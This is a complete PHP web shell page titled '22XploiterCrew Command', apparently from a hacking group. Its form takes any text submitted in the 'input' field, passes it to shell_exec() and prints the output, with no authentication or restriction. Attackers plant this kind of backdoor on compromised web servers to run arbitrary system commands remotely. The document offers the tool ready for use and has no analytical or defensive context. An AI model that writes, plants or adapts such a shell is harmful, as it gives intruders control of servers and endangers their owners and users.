<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Almendra+Display|Almendra+SC|Piedra&display=swap" rel="stylesheet">
    <title>22XploiterCrew Command</title>
    <style>
    	h2{
    		font-family: "Almendra SC";
    	}
    </style>
  </head>
  <body>

    <div class="container mt-4 shadow-lg p-3">
    	<h2 class="text-center">Command Shell</h2>
    </div>
    <div class="container mt-4 shadow-lg p-3">
    	<form method="post">
    		<input type="text" name="input" class="form-control" placeholder="Input...">
<?php
if(isset($_POST['input'])){
$input = $_POST['input'];
echo '<hr>Result<hr>
<div class="table-responsive-lg">
	<pre>'.shell_exec($input).'</pre>
</div>';
}
?>
    	</form>
    </div>

  </body>
</html>